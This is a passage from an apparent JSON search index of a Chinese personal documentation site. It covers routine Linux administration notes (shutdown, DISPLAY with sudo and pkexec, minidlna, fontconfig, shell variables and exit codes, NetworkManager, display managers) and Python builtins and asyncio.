，你可以man shutdown 来看一下帮助文档。\n例如你可以运行如下命令关机, 先存数据: sync 将数据由内存同步到硬盘中 执行shutdown 关机指令，例如你可以运行如下命令关机: shutdown –h 10 ‘This server will shutdown after 10 mins' 计算机将在10分钟后关机，并且会显示在登陆用户的当前屏幕中。\nshutdown –h now 立马关机\nshutdown –h 20:25 系统会在今天20:25关机\nshutdown –h +10 十分钟后关机\nshutdown –r now 系统立马重启\nshutdown –r +10 系统十分钟后重启 或者reboot 就是重启，等同于 shutdown –r now: reboot 或者 halt 关闭系统，等同于shutdown –h now 和 poweroff: halt","tags":"操作系统","url":"/yq-docs-operating-system-linux-Conceptual-The-startup-process-of-the-Linux-system.html","loc":"/yq-docs-operating-system-linux-Conceptual-The-startup-process-of-the-Linux-system.html"},{"title":"终端 tty console区别","text":"冲浪看到的: https://www.zhihu.com/question/21711307/answer/2231006377 若无了可见pdf: ../../../../resources/pdf/终端、Shell、tty 和控制台（console）有什么区别？ - 知乎.pdf","tags":"操作系统","url":"/yq-docs-operating-system-linux-Conceptual-Ty-Console-difference-between-terminals.html","loc":"/yq-docs-operating-system-linux-Conceptual-Ty-Console-difference-between-terminals.html"},{"title":"Linux下DISPLAY作用","text":"DISPLAY用来设置将图形显示到何处, 或者说设置或显示当前的显示环境\n(指定X服务器的现实设备) 格式: hostname:display.number.screen.number hostname表示运行X服务器的主机名或IP地址 display.number表示X服务器的编号 screen.number表示屏幕的编号 默认值: 当你在终端中启动X服务器时，系统会自动设置DISPLAY环境变量的值。\n通常情况下，默认值为:0.0，表示使用本地主机上的第一个X服务器和第一个屏幕。 显示当前的显示环境: echo $DISPLAY 一些常见使用 设置显示环境 设置显示环境为本地显示器: export DISPLAY=:0 设置显示环境为第二个本地显示器: export DISPLAY=:1 设置显示环境为ip地址的第一显示器: export DISPLAY=ip:0 控制X11程序在哪个显示器上启动 当设置了display变量后,启动的X11程序默认会在该显示环境打开。 例如, 在第二个显示器上启动xterm: export DISPLAY=:1\nxterm 运行远程程序 在本地显示远程linux服务器上的图形界面程序: ssh -X remote_server\nexport DISPLAY=localhost:0.0    # 设置远程显示环境为本地显示器\nxterm                           # 远程服务器上的xterm将显示在本地显示器上 特殊情况, 提权后的变化 主要针对使用 sudo, su, pkexec 这类指令. 设定当前登录普通用户为 bob 测试机器, ubuntu20 场景1: 使用 sudo su 切换root 效果是切到到了root, 仅保留了最初用户(切换时使用的用户bob)的环境变量. 这个时候, DISPLAY的值没有变化 场景2: 使用 sudo su - 切换root 效果是切到到了root, 同时加载root环境变量. 这个时候, DISPLAY的值是空字符串(root环境变量没有指定时) 场景3: 使用 pkexec <cmd> 切换root 效果是只能以root身份执行当次cmd, 会保留用户bob的 DISPLAY 值,\n但是, 使用的这个DISPLAY界面是受限制的,\npkexec启动的图形程序会在一个纯净和受限的X session下运行 实际场景: pkexec + sudo 实际的应用场景就是 pkexec 的 cmd 做了一些操作后, 启动图形界面\n时(比如存在SDL依赖), 需要以bob的身份启动: pkexec bash -c \"xxx; sudo -u bob start_app\" 这个时候就报错: failed to initialize SDL: No available video device 虽然pkexec会保留, 但是效果貌似还是行, 需要在pkexec之前手动重置: pkexec bash -c \"export DISPLAY=$DISPLAY; sudo -u bob start_app\"\n# pkexec bash -c \"env DISPLAY=$DISPLAY sudo -u bob start_app\" 脚本中使用 export DISPLAY 或 env DISPLAY , 一直会出现export这一步卡住的问题,\n暂时没有找到原因. 不排除是 pkexec 使用了一些安全机制来隔离和限制启动进程的权限,\n如对环境变量的修改, 导致 export 这一步会永远等待 ,看起来就像卡住了一样. 但是直接在命令行执行又不会卡, 就很懵.\n且不export或者不env时候, 打印出的 DISPLAY 值是正确的,\n必须得显示设置一下, 才能正常启动(我这里是启动的SDL).\n而同事的 ubuntu18 又没有这个问题... 又尝试了一下, 发现直接: pkexec bash xxx.sh 而 xxx.sh 内部是读不到 DISPLAY 的值的.\n卡的原因也找到了, 脚本加了: set -eu 因为没有定义 DISPLAY , 所以使用的时候直接退出了(-u) 注解 这里没搞懂是根据什么来判断受限的, 试过不重置, 子进程也能正常获取到DISPLAY. 为什么export能清除掉受限状态.","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-environment-variable-Disch.html","loc":"/yq-docs-operating-system-linux-Linux-environment-variable-Disch.html"},{"title":"Linux下配置DLAN服务","text":"DLAN是一个适用于多媒体的传输协议 安装 minidlna: sudo apt-get install -y minidlna 编辑 minidlna 的配置文件 /etc/minidlna.conf media_dir=/path/to/media\ndb_dir=/var/lib/minidlna\nlog_dir=/var/log/minidlna\nfriendly_name=DLNA Server\nport=8200 其中 media_dir 是您媒体文件所在的目录，可以指定多个目录； friendly_name 是服务器名称； port 是服务监听的端口号。 启动 minidlna 服务: sudo service minidlna start 添加共享文件夹: sudo minidlna -R 此命令将重新扫描 media_dir 中的媒体文件，并添加到 DLNA 服务器中。 测试 DLNA 服务器是否正常工作： 使用支持 DLNA 协议的设备或软件，\n例如 VLC 播放器、Windows Media Player 等，连接到 DLNA 服务器的 IP 地址和端口号即可访问。 如果一切正常，则应该可以浏览、搜索和播放媒体文件了。","tags":"操作系统","url":"/yq-docs-operating-system-linux-Tutorial-Configure-the-DLAN-service-under-Linux.html","loc":"/yq-docs-operating-system-linux-Tutorial-Configure-the-DLAN-service-under-Linux.html"},{"title":"debian/ubuntu字体说明","text":"Ubuntu字体及配置说明: https://wiki.ubuntu.org.cn/字体#.E9.85.8D.E7.BD.AE.fonts.conf 参考: https://catcat.cc/post/2020-10-31/ Linux 桌面程序使用字体的方式，受 fontconfig 的影响和控制。 一个字体文件，可以提供多个字体族名 (family)。\n比如 Arch Linux 用户在 安装 wqy-microhei 后，\n系统端增加了 wqy-microhei.ttc 这个 字体文件，\n分别提供「WenQuanYi Micro Hei」「文泉驛微米黑」,「文泉驿微米黑」 三个字体族名，\n它们是一个意思。可以运行 fontconfig 提供的命令行工具 fc-list\n去查看系统上 已安装的字体已经它们对应的字体族名。 至于 sans-serif，serif，monospace，则是三个通用字体族名 (generic family)，\n它们不是真实存在的字体，而是分别指示程序去使用无衬线、衬线、等宽字体。\n那么桌面程序又是如何知道具体使用哪些字体呢？\n它只需要去查询 fontconfig 就行了。\n由于它们必定要经过 fontconfig 的查询流程后才能使用字体，\n所以我们可以通过 fontconfig 的配置去精准控制程序使用的字体。 配置文件流向 fontconfig 主要读取 /etc/fonts/fonts.conf /etc/fonts/conf.d/*.conf ~/.config/fontconfig/fonts.conf ~/config/fontconfig/conf.d/*.conf 至于那些历史遗留的目录位置 ~/.fonts.conf.d/*.conf 和 ~/.fonts.conf ， 由于不遵守 XDG 规范，我们就不要再使用它们了。 fontconfig 并非固定读取这些位置，它首先读取 /etc/fonts/fonts.conf，该文件中有句: <include ignore_missing=\"yes\">conf.d</include> 表示将 /etc/fonts/conf.d/ 目录中的文件纳入读取中,\n在这个目录中的配置文件，按照文件名前的数字的顺序进行读取。\n而当读取到50-user.conf的时候，其中的语句: <include ignore_missing=\"yes\" prefix=\"xdg\">fontconfig/conf.d</include>\n<include ignore_missing=\"yes\" prefix=\"xdg\">fontconfig/fonts.conf</include>\n<include ignore_missing=\"yes\" deprecated=\"yes\">~/.fonts.conf.d</include>\n<include ignore_missing=\"yes\" deprecated=\"yes\">~/.fonts.conf</include> 指示 fontconfig 开始读取用户家目录下的配置文件。\n语句中的属性值prefix=\"xdg\"，代表 XDG_CONFIG_HOME 目录， 默认是我们熟悉的~/.config/目录。 字体文件位置 fontconfig 的很多配置文件是先从/etc/fonts/fonts.conf引入的。\n其实，fontconfig 获取字体文件的位置，也是该文件定义的。\n你会发现 该文件的开头就在指定字体目录: <dir>/usr/share/fonts</dir>\n<dir>/usr/local/share/fonts</dir>\n<dir prefix=\"xdg\">fonts</dir>\n<!-- the following element will be removed in the future -->\n<dir>~/.fonts</dir> 当我们安装字体软件包时，软件包把字体文件放在了/usr/share/fonts/目录下 配置自己的规则 比如我已经提前安装好了 inconsolata 字体,\n然后在家目录下设置了配置文件,\n新建文件 ~/.config/fontconfig/fonts.conf : <?xml version=\"1.0\"?>\n<!DOCTYPE fontconfig SYSTEM \"/etc/fonts/conf.d/fonts.dtd\">\n<fontconfig>\n<match target=\"pattern\">\n  <test qual=\"any\" name=\"family\">\n    <string>monospace</string>\n  </test>\n  <edit name=\"family\" mode=\"prepend\" binding=\"strong\">\n    <string>inconsolata</string>\n    <string>Iosevka Custom</string>\n    <string>Noto Sans Mono CJK SC</string>\n    <string>Blobmoji</string>\n    <string>Symbols Nerd Font</string>\n  </edit>\n</match>\n</fontconfig> 这个时候查询等宽字体的结果就是我设置的这个: $ fc-match \"monospace\"\nInconsolata.otf: \"Inconsolata\" \"Medium\" 解释一下这里配置含义 fontconfig 表示是一个字体查询配置 match 匹配规则, <match target=\"pattern\"> ，被操作对象是 font pattern; 如果是 <match target=\"font\"> , 则是对单个字体的操作 test 定义匹配规则, 可选的测试条件。只有当满足测试条件的时候，才执行<edit>; 这里表示匹配 monospace 家族 edit 表示匹配的字体结果 此处完整含义: 在这里，test 语句针对了 font pattern 中的 monospace。\n也就是说， 接下来的 edit 语句就在 font pattern 的 monospace 这个位置上进行操作。\nmode=\"prepend\"的意思是在 monospace 前添加四个字体：\n等宽字体 inconsolata，\n英文等宽字体 Iosevka Custom，\n中文字体 Noto Sans Mono CJK SC，\n以及通用字体族名 emoji。\nbinding=\"strong\"，是强绑定的意思， 它会影响 font pattern 的排序结果， name=\"family\" 表明被操作对象是是 font pattern 中的 family。 mode=\"prepend\" 表示在结果之前插入;\n如果是 mode=\"assign\" , 表示对test中的String修改替换. 如向 fc-match 传入的 font pattern 是可以有多个字体的。 现在我们要运行: FC_DEBUG=4 fc-match 'cantarell, WenQuanYi Micro Hei' 经过这段配置会变成什么呢: <match target=\"pattern\">\n  <test name=\"family\">\n    <string>Cantarell</string>\n  </test>\n  <edit name=\"family\" mode=\"assign\" binding=\"strong\">\n    <string>Noto Sans</string>\n  </edit>\n</match> 这里的mode=\"assign\"，表示 将 font pattern 中的 Cantarell 修改成 Noto Sans。\n没有对 WenQuanYi Micro Hei 的操作，所以结果是: family: \"Noto Sans\"(s) \"WenQuanYi Micro Hei\"(s) binding=\"strong\" 表示强绑定 下面的 String 的内容的是结果列表, 支持多个 先后顺序就是设置的优先使用的字体顺序。\n最先尝试使用 inconsolata 字体作为英文等宽字体,\n然后才是 Iosevka ， 中日韩字体使用 Noto Sans Mono CJK SC ，\n剩下的 emoji 和特殊符号 优先使用 Blobmoji 和 Nerd font 。 完整属性说明可参考: https://www.cnblogs.com/jacker1979/p/4695169.html 注解 旧版是使用的alias: <match>...<test>...<edit name=\"family\" mode=\"prepend\">...\n\n等价于\n\n<alias>...<family>...<prefer>...","tags":"操作系统","url":"/yq-docs-operating-system-linux-Tutorial-Debian-Ubuntu-font-description.html","loc":"/yq-docs-operating-system-linux-Tutorial-Debian-Ubuntu-font-description.html"},{"title":"GNOME文件管理器内添加右键菜单","text":"目前已测试适用与 Ubuntu20 nautilus nautilus 是 GNOME 自带的文件管理器, 可以理解为Win的文件管理器 使用系统自带的 .local/share/nautilus/scripts 只能在右键单击文件时候弹出所添加的脚本 目前经过多方搜索, 暂时只确定了使用额外的包 nautilus-actions 辅助解决,\n新版本是 filemanager-actions . 其实核心都是一样的, 就是 nautilus 在\n新版更名为 filemanager . 旧版本安装: apt install nautilus-actions 新版本安装: apt install filemanager-actions 安装后带开图形界面进行右键菜单的编辑, 选择新建菜单/新建动作即可, 注意默认是有一个 filemanager 的根菜单,\n如果不想要, 在 编辑-首选项-运行时首选项-Nautils菜单布局 下取消勾选即可. 新版 filemanager 的配置文件在 ~/.config/filemanager-actions 下面,\n而自定义的配置的文件位置在 ~/.local/share/nautilus/file-manager/actions 下. ~/.local/share/nautilus/file-manager/actions 下还是 .desktop 文件,\n例: [Desktop Entry]\nType=Action\nName=菜单项名称\nIcon=/path/to/your/icon.png\nExec=/path/to/your/command \"%F\"\nName[en_US]=菜单项名称\n\n[Desktop Action 菜单项名称]\nName=子菜单项名称\nExec=/path/to/your/command \"%F\"\nIcon=/path/to/your/icon.png","tags":"操作系统","url":"/yq-docs-operating-system-linux-Tutorial-Right--click-menu-to-the-gnome-file-manager.html","loc":"/yq-docs-operating-system-linux-Tutorial-Right--click-menu-to-the-gnome-file-manager.html"},{"title":"Linux各种$(美元符)","text":"$$ Shell本身的PID（ProcessID，即脚本运行的当前 进程ID号） $! Shell最后运行的后台Process的PID(后台运行的最后一个进程的 进程ID号) $? 最后运行的命令的结束代码（返回值）即执行上一个指令的返回值\n(即显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误) $- 显示shell使用的当前选项，与set命令功能相同 $* 所有参数列表。如 \"$*\" 用「\"」括起来的情况,\n表示以 $1 $2 … $n 的形式输出所有参数，此选项参数可超过9个。 $@ 所有参数列表。如 \"$@\" 用「\"」括起来的情况, 表示以 \"$1\" \"$2\" … \"$n\" 的形式输出所有参数。 $@ 跟 $* 类似，但是可以当作数组用 $# 添加到Shell的参数个数 $0 Shell本身的文件名 $1~$n 添加到Shell的各参数值. $1 是第1参数, $2 是第2参数…。 !$ 最后执行的语句以及结果","tags":"操作系统","url":"/yq-docs-operating-system-linux-Tutorial-shell-grammar-specification-Linux-various-$.html","loc":"/yq-docs-operating-system-linux-Tutorial-shell-grammar-specification-Linux-various-$.html"},{"title":"逻辑与","text":"即 && , 主要说一下与 & 一起使用的情况 如: cmd1 && cmd2 && cmd3 & 默认表示 cmd1 && cmd2 && cmd3 都在后台执行","tags":"操作系统","url":"/yq-docs-operating-system-linux-Tutorial-shell-grammar-specification-Logic-and.html","loc":"/yq-docs-operating-system-linux-Tutorial-shell-grammar-specification-Logic-and.html"},{"title":"shell的变量替换","text":"几种特殊的替换结构 四种: ${var:-string}\n${var:+string}\n${var:=string}\n${var:?string} ${var:-string} 和 ${var:=string} : 若变量var为空，则用在命令行中用string来替换${var:-string}，\n否则变量var不为空时，则用变量var的值来替换${var:-string}； 对于${var:=string}的替换规则和${var:-string}是一样的，\n所不同之处是${var:=string}若var为空时，用string替换${var:=string}的同时，把string赋给变量var; ${var:=string}很常用的一种用法是，判断某个变量是否赋值，没有的话则给它赋上一个默认值 ${var:+string} 替换规则和上面的相反，即只有当var不是空的时候才替换成string，\n若var为空时则不替换或者说是替换成变量 var的值，\n即空值。(因为变量var此时为空，所以这两种说法是等价的) ${var:?string} 若变量var不为空，则用变量var的值来替换${var:?string}；\n若变量var为空，则把string输出到标准错误中，并从脚本中退出。\n我们可利用此特性来检查是否设置了变量的值。 注解 上面这四种替换结构中string不一定是常值的，可用另外一个变量的值或是一种命令的输出。 四种模式匹配替换结构 模式匹配记忆方法： # 是去掉左边(在键盘上#在$之左边) % 是去掉右边(在键盘上%在$之右边) # 和 % 中的单一符号是最小匹配，两个相同符号是最大匹配。 也是四种: ${var%pattern}\n${var%%pattern}\n${var#pattern}\n${var##pattern} 第一种模式: ${variable%pattern} shell在variable中查找，看它是否一给的模式pattern结尾，\n如果是，就从命令行把variable中的内容去掉右边最短的匹配模式 第二种模式: ${variable%%pattern} shell在variable中查找，看它是否一给的模式pattern结尾，\n如果是，就从命令行把variable中的内容去掉右边最长的匹配模式 第三种模式: ${variable#pattern} shell在variable中查找，看它是否一给的模式pattern开始，\n如果是，就从命令行把variable中的内容去掉左边最短的匹配模式 第四种模式: ${variable##pattern} shell在variable中查找，看它是否一给的模式pattern结尾，\n如果是，就从命令行把variable中的内容去掉右边最长的匹配模式 注解 这四种模式中都不会改变variable的值，\n其中, 只有在pattern中使用了 ``*`` 匹配符号时 , %和%%，#和##才有区别. 结构中的pattern支持通配符, * 表示零个或多个任意字符; ? 表示仅与一个任意字符匹配; [...] 表示匹配中括号里面的字符; [!...] 表示不匹配中括号里面的字符. 示例: var=testcase\n\necho $var\n#testcase 去掉右边的se: echo ${var%s*e}     #testca\necho $var           #testcase 去掉s..e: echo ${var%%s*e}    #te 去掉左边第一个e之前的（包括自己）: echo ${var#?e}      #stcase 去掉se: echo ${var##?e}     #stcase 去自己: echo ${var##*e}     # 去的就剩个e: echo ${var##*s}     #e 去test: echo ${var##test}   #case","tags":"操作系统","url":"/yq-docs-operating-system-linux-Tutorial-shell-grammar-specification-SHELL-variable-replacement.html","loc":"/yq-docs-operating-system-linux-Tutorial-shell-grammar-specification-SHELL-variable-replacement.html"},{"title":"shell下while与set","text":"使用了: set -e 时, 一定要注意不能包裹 while 语句. while语句的最后一次结果, 会返回1, 退出while循环, 然后set -e就会觉得是代码报错了, 不给后续代码执行 例: set -e\n\nblue_echo(){\n    local _strs\n    _strs=\"$*\"\n\n    echo \"\\e[1;36m${_strs}\\e[0m\\n\"\n}\n\npv_blue_echo(){\n    local _time\n    _time=\"$1\"\n\n    set +e\n\n    while [ ${_time} -gt 0 ]; do\n\n        blue_echo \"................\" | pv -qL 15\n        _time=\"$(expr \"${_time}\" - 1)\"\n    done\n\n    set -e\n}\n\n# pv_blue_echo 3","tags":"操作系统","url":"/yq-docs-operating-system-linux-Tutorial-shell-grammar-specification-Under-shell-and-set.html","loc":"/yq-docs-operating-system-linux-Tutorial-shell-grammar-specification-Under-shell-and-set.html"},{"title":"shell退出状态码","text":"Linux退出状态码 状态码 描述 0 命令成功结束 1 通用未知错误 2 误用shell命令 126 命令不可执行 127 没找到命令 128 无效退出参数 128+x Linux信号x的严重错误 130 命令通过Ctrl+C终止 255 退出状态码越界 返回值 只能返回整数值: #!/bin/bash\n\nfunction getResultFun(){\n    echo \"这是我的第一个 shell 函数!\"\n    return `expr 1 + 1`\n}\n\ngetResultFun\necho $?","tags":"操作系统","url":"/yq-docs-operating-system-linux-Tutorial-shell-grammar-specification-shell-exit-status-code.html","loc":"/yq-docs-operating-system-linux-Tutorial-shell-grammar-specification-shell-exit-status-code.html"},{"title":"debian查看版本","text":"在 Debian 或基于 Debian 的 Linux 发行版中，有多种方法可以查看当前系统的版本信息： 使用 lsb_release 命令: lsb_release -a 这个命令可以显示当前系统的发行版名称、版本号、Codename 和描述信息。 查看 /etc/issue 文件: cat /etc/issue 这个文件包含了当前系统的版本和发行版信息。 查看 /etc/os-release 文件: cat /etc/os-release 这个文件包含了当前系统的发行版名称、版本号、ID 和描述信息。 使用 uname 命令: uname -a 这个命令可以显示当前系统的内核版本、主机名和操作系统类型等信息。 其中，lsb_release 命令是最常用的方法之一，可以提供比较详细的系统版本信息。如果您只需要查看基本的版本信息，可以使用其他方法。","tags":"操作系统","url":"/yq-docs-operating-system-linux-debian-Debian-View-System-Version.html","loc":"/yq-docs-operating-system-linux-debian-Debian-View-System-Version.html"},{"title":"Debian包依赖","text":"要知道package的依赖方案 可以直接看报错地方的源码的要求\n也可以直接: apt-cache show $package 有些涉及到了系统的包没法操作的话: apt-get install aptitude\naptitude insatll $package             #这里会给出依赖方案，选一个可行的\n\napt-get insatll $package","tags":"操作系统","url":"/yq-docs-operating-system-linux-debian-Debian-package-dependencies.html","loc":"/yq-docs-operating-system-linux-debian-Debian-package-dependencies.html"},{"title":"debian一些了解","text":"debian的服务基本上都可以在 /etc/init.d 下找到 使用apt安装deb本地包 deb包可以通过dpkg安装: dpkg -i <package> 也可以通过apt安装: apt install ./<package> 注解 apt 安装本地deb包时, 必须指定路径, 否则会去软件仓库找.","tags":"操作系统","url":"/yq-docs-operating-system-linux-debian-debian-some-understanding.html","loc":"/yq-docs-operating-system-linux-debian-debian-some-understanding.html"},{"title":"网络管理","text":"几个相关的配置文件 /etc/resolv.conf DNS配置相关的文件, 内容就是当前正在使用的DNS,\n如: #\n# macOS Notice\n#\n# This file is not consulted for DNS hostname resolution, address\n# resolution, or the DNS query routing mechanism used by most\n# processes on this system.\n#\n# To view the DNS configuration used by this system, use:\n#   scutil --dns\n#\n# SEE ALSO\n#   dns-sd(1), scutil(8)\n#\n# This file is automatically generated.\n#\nnameserver 192.168.1.1\nnameserver 192.168.1.1 # 表示注释, nameserver表示使用的DNS服务器. 我这里是连的WIFI, 所以使用路由器那边网关提供的路由 /etc/network/interfaces Unix/Linux 系统网络配置的传统文件，该文件通常用于手动配置网络接口以及 IP 地址等相关参数\n高版本如Ubuntu 20.04 中，所有的网络设置都已经转移到了 NetworkManager 当中，此文件不再被默认使用.\n配置比NetworkManager 更复杂 NetworkManager /usr/lib/NetworkManager/conf.d/ 默认的系统级配置文件路径, 包含了一些系统级别的配置文件，\n它们是由软件包提供方安装的，这些文件通常不应该被用户轻易修改。\n如果您确实需要修改其中的某些配置选项，可以使用 /etc/NetworkManager/conf.d/ 目录下的本地配置文件进行覆盖。 ~/.config/NetworkManager/ 默认的用户级配置文件路径, 包含当前用户特定的NetworkManager配置文件. /etc/NetworkManager/NetworkManager.conf NetworkManager 的主要配置文件，它包含了系统级别的默认配置选项。\n在该文件中可以配置很多选项，例如要使用哪种插件来管理网络接口、是否启用 DNS 重写等等。\n如其中的 [ifupdown] 下配置 managed=true 表示自启动 /etc/NetworkManager/conf.d/ 目录, 此文件夹下可能有一些配置文件. 包含了一些本地的配置文件，\n它们会覆盖掉 /usr/lib/NetworkManager/conf.d/ 中一些系统级别的配置文件。\n如果您需要修改 NetworkManager 的某些配置选项，最好在该目录下创建一个新的配置文件，并将修改后的内容写入到该文件中。 /etc/NetworkManager/system-connections/ 包含了所有存储在系统中的网络连接的详细信息。\n每个网络连接都有一个对应的 .nmconnection 文件，其中包含了该连接的所有参数。\n如果需要手动修改某个网络连接的参数（例如 IP 地址或者 DNS 服务器），可以编辑该文件并修改对应的值。 在公司Ubuntu20的云桌面上找了很久的 Wired connection 在哪配置自动链接ipv4, 最终发现除了图形界面的设置,\n还写到了 /etc/NetworkManager/system-connections/Wired connection 1.nmconnection 而此网卡 ens18 的ip, dns在 /etc/NetworkManager/system-connections/ens18.nmconnection 注解 有一个 nmcli 指令支持 图形界面的网络配置工具 Debian 系统 NM 的官方文档位于 \" /usr/share/doc/network-manager/README.Debian \" 。 本质上，如下操作即可完成桌面的网络配置。 通过下列命令使桌面用户 foo 归属 \" netdev \" 组,\n另外，例如 GNOME 和 KDE 这样的现代桌面环境会通过 D-bus <https://zh.wikipedia.org/wiki/D-Bus> 自动完成该操作: $ sudo adduser foo netdev 使 \" /etc/network/interfaces \" 的配置保持\n下面那样简洁: auto lo\niface lo inet loopback 通过下列命令重新\n启动 NM: $ sudo systemctl restart network-manager 通过图形界面配置网络。 注解 只有 不 列在 \" /etc/network/interfaces \" 中的接口会被 NM 管理，以避免与 ifupdown 的冲突。 如果你想扩展 NM 的网络配置功能，请寻找适当的插件模块和补充软件包，\n例如 network-manager-openconnect 、 network-manager-openvpn-gnome 、s s network-manager-pptp-gnome 、 mobile-broadband-provider-info 、 gnome-bluetooth 等等。","tags":"操作系统","url":"/yq-docs-operating-system-linux-network-Network-management.html","loc":"/yq-docs-operating-system-linux-network-Network-management.html"},{"title":"Linux图形界面","text":"此篇主要针对与Ubuntu20 仅以此篇, 纪念那云桌面重启后的丢失的图形界面 Ubuntu的桌面系统分: 桌面环境 显示器管理器 桌面环境 常见的有 GNOME KDE Xfce 显示器管理器 显示管理器向用户显示登录屏幕。 当用户成功输入用户名和密码的有效组合时，会话开始。gdm3，kdm 和 lightdm 都是显示管理器。 它们提供图形化登录并处理用户身份验证。 gdm，gnome系列的图形管理器。 kdm, SDDM是KDE系列的图形管理器。 lightdm是另一种跨桌面DM。该显示管理器的主要功能是重量轻，这意味着它在占用很少内存的情况下提供了出色的性能。 查看当前使用的显示器管理器: cat /etc/X11/default-display-manager 可能的值: /usr/sbin/gdm3\n或\n/usr/sbin/lightdm\n或\n/usr/sbin/sddm 注解 可直接执行: sudo gdm\n或\nsudo startx 进入图形界面. 切换显示器管理器: sudo dpkg-reconfigure <Default_Display_Manager> 如: sudo dpkg-reconfigure gdm3\n或\nsudo dpkg-reconfigure lightdm\n或\nsudo dpkg-reconfigure sddm","tags":"操作系统","url":"/yq-docs-operating-system-linux-ubuntu-graphic-interface.html","loc":"/yq-docs-operating-system-linux-ubuntu-graphic-interface.html"},{"title":"getattr","text":"返回一个对象属性值 getattr 语法: getattr(object, name[, default])","tags":"后端; python","url":"/yq-docs-rear-end-python-Built--in-function-Getattr.html","loc":"/yq-docs-rear-end-python-Built--in-function-Getattr.html"},{"title":"isinstance","text":"是否是字典: isinstance(str, dict)","tags":"后端; python","url":"/yq-docs-rear-end-python-Built--in-function-Isinstance.html","loc":"/yq-docs-rear-end-python-Built--in-function-Isinstance.html"},{"title":"locals","text":"locals() 函数会以字典类型返回当前位置的全部局部变量。 对于函数, 方法, lambda 函式, 类, 以及实现了 __call__ 方法的类实例, 它都返回 True: >>>def runoob(arg):    # 两个局部变量：arg、z\n...     z = 1\n...     print (locals())\n...\n>>> runoob(4)\n{'z': 1, 'arg': 4}      # 返回一个名字/值对的字典\n>>>","tags":"后端; python","url":"/yq-docs-rear-end-python-Built--in-function-Locals.html","loc":"/yq-docs-rear-end-python-Built--in-function-Locals.html"},{"title":"__import__","text":"用于动态加载类和函数 参数 __import__(name, globals=None, locals=None, fromlist=(), level=0) name: str 导入的模块名, 当 fromlist 为空时, 返回的是顶层模块 globals: None/globals()/locals() 模块作用范围, 全局变量或局部变量.\n默认None, 一般不用设置 fromlist: list 导入子模块的集合. level: int 0表示绝对导入, 为正使用相对导入, 相对于调用__import __()的模块目录","tags":"后端; python","url":"/yq-docs-rear-end-python-Built--in-function-__import__.html","loc":"/yq-docs-rear-end-python-Built--in-function-__import__.html"},{"title":"__init__","text":"属于 object类 用于类中，一般表示初始化类（构造函数） 顺便提一下 __init__.py 在Python工程里，当python检测到一个目录下存在 __init__.py 文件时，\npython就会把它当成一个模块(module)。\nModule跟C＋＋的命名空间和Java的Package的概念很像，都是为了科学地组织化工程，管理命名空间。 __init__.py 可以是一个空文件，也可以有非常丰富的内容。 __init__.py 的原始使命是声明一个模块，所以它可以是一个空文件。\n在 __init__.py 中声明的所有类型和变量，就是其代表的模块的类型和变量 我们在利用`__init__.py`时，应该遵循如下几个原则： 不要污染现有的命名空间。\n模块一个目的，是为了避免命名冲突，如果你在种用 __init__.py 时违背这个原则，\n是反其道而为之，就没有必要使用模块了。 利用 __init__.py 对外提供类型、变量和接口，对用户隐藏各个子模块的实现。\n一个模块的实现可能非常复杂，你需要用很多个文件，甚至很多子模块来实现，\n但用户可能只需要知道一个类型和接口。由于各个子模块的实现有可能非常复杂，\n而对外提供的类型和接口有可能非常的简单，我们就可以通过这个方式来对用户隐藏实现，同时提供非常方便的使用。 只在 __init__.py 中导入有必要的内容，不要做没必要的运算。\n如果我们在 __init__.py 中做太多事情，每次import都会有额外的运算，会造成没有必要的开销。 和 __main__.py 区别 当在文件夹下时 __init__.py 表示是一个模块(把当前文件所在文件夹视为一个模块，相当于把此文件夹的上一层加入path) __main__.py 表示文件所在文件夹可以直接执行（把当前文件所在路径加入到sys.path） 举个例子, 把他们都放到 test 文件夹下 执行 pyton test 只会执行 __main__.py 执行 python -m test 会先执行 __init__.py ， 再执行 __main__.py","tags":"后端; python","url":"/yq-docs-rear-end-python-Built--in-function-__init__.html","loc":"/yq-docs-rear-end-python-Built--in-function-__init__.html"},{"title":"协程","text":"常用的异步库见: asyncio 基于python特性, 于是有了单线程内多任务, 即协程, 是一种轻量级线程 (另一方面, 避免了线程在内核的切换, 而是用户态类似函数的快捷切换) 这里主要适用于 python3.5 以上的版本(asyncio是3.5以后才引入的) 定义一个异步函数: async def say_hello():\n  print(aa := 'hello')\n  return aa 同步函数中使用 run_until_complete 同步获取结果: import asyncio\ndef test_a():\n  loop = asyncio.get_event_loop()\n  # 使用 run_until_complete 同步获取结果\n  res = loop.run_until_complete(say_hello())\n  print(f'end {res}',) 在协程函数中使用await也可以获取结果，但是最终还是需要一个look来进行获取结果: async def some_a_a():\n  res = await say_hello()\n\n  # 多个协程并发执行\n  # 方法1：使用 asyncio.gather\n  res1, res2 = await asyncio.gather(say_hello(), say_hello())\n\n  # 方法2：使用 asyncio.ensure_future 创建 task，或者使用 asyncio.create_task(), 暂时还不确定区别，不过前者在某些情况下会触发后者，\n  #   还可以调用future对象\n  # 此时进入 pending 状态， 可以通过 task.done() -> done 获取是否执行\n  task1, task2 = asyncio.ensure_future(say_hello()), asyncio.ensure_future(say_hello())\n\n  # await task1, task2\n  # res11, res22 = task1.result(), task2.result()\n\n  res11, res22 = await task1, await task2\n\n  print(res, res1, res2, res11, 'res11', res22)\n\n  return 1 同步函数中直接通过 run调用获取结果: def test_run():\n  # 直接通过 run调用获取结果， 将 some_a_a 转换为一个task\n  aa = asyncio.run(some_a_a())\n  print(aa) asyncio.wait 和 asyncio.gather 详情可参考: asyncio await asyncio.wait(task_list)\nawait asyncio.gather(*task_list) 相同 从功能上看，asyncio.wait 和 asyncio.gather 实现的效果是相同的，都是把所有 Task 任务结果收集起来。 不同 asyncio.wait 会返回两个值：\ndone 和 pending，\ndone 为已完成的协程 Task，pending 为超时未完成的协程 Task，\n需通过 future.result 调用 Task 的 result； 而asyncio.gather 返回的是所有已完成 Task 的 result，\n不需要再进行调用或其他操作，就可以得到全部结果。 asyncio 中await和create_task的区别 参考: https://blog.csdn.net/luchengtao11/article/details/124527729 await的理解 立即开始执行协程对象，并允许它被挂起。--如果没有可被挂起的逻辑，则不会让出执行权 与 task的不同之处 create_task，是在loop里执行的，所以在loop调度该task之前，其他的task还是有机会运行的。 await使用的当前的context，而create_task会拷贝一份context 总结就是：create_task的消耗会更高一些。await执行过程中如果没有可以被挂起的地方，则其他任务就永远不会被执行。 简而言之, 在任务调度执行中, 由于无法在同步任务中再使用时间循环获取结果, 所以只有定义为异步方法使用await,\n或者在同步任务中创建一个任务, 并给他足够时间以得到执行, 创建任务会放到事件循环中, 等待异步自动调度执行. 